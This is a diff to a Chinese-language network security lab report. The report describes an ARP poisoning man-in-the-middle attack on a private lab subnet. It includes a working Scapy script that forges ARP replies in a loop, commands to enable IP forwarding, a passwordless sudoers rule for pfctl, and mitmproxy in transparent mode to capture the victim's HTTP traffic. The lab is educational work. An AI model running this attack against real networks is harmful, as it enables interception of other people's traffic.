@@ -13,7 +13,7 @@
 - 攻击者 Attacker：
     - OS: MacOS 10.14
 - 服务器 Server：
-    - OS: MacOS
+    - OS: MacOS 10.13
     - IP: 192.168.1.107
 - 客户机 Victim：
     - OS: Windows 10
@@ -24,27 +24,33 @@
 
 ### 要求1
 
-1. 首先将三台主机连入子网，为server配置http服务，随后用客户机victim通过浏览器访问服务器ip地址，可以得到 http response 如下：
+1. 首先将三台主机连入子网，为server配置http服务：
+
+    ```bash
+        $ python3 -m http.server 80
+    ```
+
+2. 随后用客户机victim通过浏览器访问服务器ip地址，可以得到 http response 如下：
 
     ![HTTP RESPONSE](fig/browser_norm.PNG)
 
-2. 在攻击者上编写arp poison脚本，原理是利用Scapy分别向server和victim不断发送被修改过的ARP包，从而在二者的ARP缓存中投毒，将两者对于对方的ARP缓存均更改为attacker的MAC地址。脚本详见`src/arp_poison.py`，主要内容如下：
+3. 在攻击者上编写arp poison脚本，原理是利用Scapy分别向server和victim不断发送被修改过的ARP包，从而在二者的ARP缓存中投毒，将两者对于对方的ARP缓存均更改为attacker的MAC地址。脚本详见`src/arp_poison.py`，主要内容如下：
 
     ```py
         server_ip = "192.168.1.107"
         victim_ip = "192.168.1.104"
-
+    
         # 获取目标ip的MAC地址
         def get_mac(ip_address):
             ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
             for s, r in ans:
                 return r[Ether].src
             return None
-
+    
         # 分别获取二者的MAC
         victim_mac = get_mac(victim_ip)
         server_mac = get_mac(server_ip)
-
+    
         # 构造ARP包
         # 发给server的包中，源ip为victim，但源mac为attacker
         # 发给victim的包类似
@@ -53,13 +59,13 @@
         poison_server.psrc = victim_ip
         poison_server.pdst = server_ip
         poison_server.hwdst = server_mac
-
+    
         poison_victim = ARP()
         poison_victim.op = 2
         poison_victim.psrc = server_ip
         poison_victim.pdst = victim_ip
         poison_victim.hwdst = victim_mac
-
+    
         # 循环发送，保证占有ARP缓存
         while True:
             send(poison_server)
@@ -67,13 +73,14 @@
             time.sleep(2)
             print("Poisoning...")
     ```
-3. 执行上面的脚本，开始ARP投毒
+
+4. 执行上面的脚本，开始ARP投毒
 
     ```bash
         $ python arp_poison.py
     ```
 
-4. 为了使用mitmproxy，attacker需要开启转发，流程参考 [mitmproxy docs](https://docs.mitmproxy.org/stable/howto-transparent/#macos)，具体操作如下：
+5. 为了使用mitmproxy，attacker需要开启转发，流程参考 [mitmproxy docs](https://docs.mitmproxy.org/stable/howto-transparent/#macos)，具体操作如下：
 
     ```bash
         $ sudo sysctl -w net.inet.ip.forwarding=1
@@ -86,12 +93,12 @@
         ALL ALL=NOPASSWD: /sbin/pfctl -s state
     ```
 
-5. 开启`mitmproxy`进行流量监听：
+6. 开启`mitmproxy`进行流量监听：
     ```bash
         $ mitmproxy --mode transparent
     ```
 
-5. 此后，victim再向server发送请求时，attacker都会监听到HTTP会话，如，victim再次通过浏览器访问server时，attacker可以监控到相应的GET和Response：
+7. 此后，victim再向server发送请求时，attacker都会监听到HTTP会话，如，victim再次通过浏览器访问server时，attacker可以监控到相应的GET和Response：
     ![transparent](fig/transparent.png)
 
 ### 要求2
